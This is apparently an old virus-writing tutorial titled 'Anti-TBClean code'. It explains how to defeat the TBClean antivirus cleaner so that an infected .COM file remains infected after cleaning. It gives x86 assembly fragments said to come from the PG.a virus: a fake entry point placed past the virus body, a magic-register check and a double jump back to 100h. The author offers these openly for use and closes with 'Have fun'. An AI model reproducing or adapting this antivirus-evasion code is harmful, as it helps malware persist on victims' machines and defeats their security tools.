Anti-TBClean code by Ghost 
             
      


Working around the generic cleaning ability of TBClean is easy to do.
The following code fragments come from the PG.a virus. This code works
with all versions of TBClean from 6.20 to 7.00 (that's all the versions I
have :)

The first thing to realize is that TBClean works very generically. It
assumes that a .COM infector will prepend a small jump construct, saving
the orginal code, and then append the rest of the virus to the end of the
victim file. It then expects the virus to clean the .COM file, and jump
back to 100h, as though the .COM file had just started.

What we need to do to fool TBClean is 2 parts. First we must fool
TBClean into thinking that the virus starts past where the virus actually
is. Second, we need to JMP back to 100h TWICE. Once BEFORE we clean up
the .COM header.

-----------------------------
Step 1: The Virus Jump Header
-----------------------------

Check a certain (your choice :) register for a value, and if this
magic value is there, do a RET. This will be called from below just
before we restore the .COM header. Next write a C3h to the first byte of
the heap (1 byte past the last code/data of the virus). Then call this
address. This will make TBClean think this is the entry point into the
virus, but it's PAST the virus. TBClean will truncate the file when it
cleans, but by doing this, that truncate is to the EXACT same size as it
was when infected. Net result, the virus still lives :)

model tiny
.code

org 100h

start:
; Step 1 part 1
cmp ah, 30h ; the check for the MAGIC number
je TBCleaning ; yeah right (TBClean thinks so :)

mov ax, offset start_vir ; This is the delta offset
; (it MUST be set when
; infecting a file, before
; the header is written to
; the file.)

mov bx, ax
add bx, vir_size
mov byte ptr[bx], 0C3h ; one byte past the END of the
;virus :)

; TBCLEAN will clean to the address here (it's at the VERY
;last byte of the file image) It doen't matter if it is there
;or not! When TBClean is done cleaning this file, it is STILL
;infected!!

; Step 1 part 2
call bx

jmp start_vir ; jump to the virus code
TBCleaning:
ret ; return back to the .COM fixing
; part.


start_vir: ; THE VIRUS STARTS HERE
mov bp, bx ; put the delta offset into BP

--------------------------------------
Step 2: The .COM file restoration code
-------------------------------------

The final step is to trick TBClean into believing that the virus has
ended, and that the .COM file is being started. Remember in step 1 where
we checked for a MAGIC value in a register, well, we set up the register
with that magic value here, and the do a CALL back to 100h. TBClean will
think the virus has ended at this point, and will truncate the file
(remember TBClean thinks the file should be trucated to the EXACT size that
it is when infected :) After the code returns, then we fix up the .COM
header, clear the registers, and JMP back to 100h and let the .COM file go
on its way.

start_com:
; Anti-TBClean code
mov ah, 30h ; Setup the MAGIC value in AH.
mov bx, 100h
push bx
call bx

CopyCOMHeader:
; standard .COM re-starting code here.
...

ret ; bx = 100h is still on stack.


Have fun. TBClean is such a fun product to mess with :)
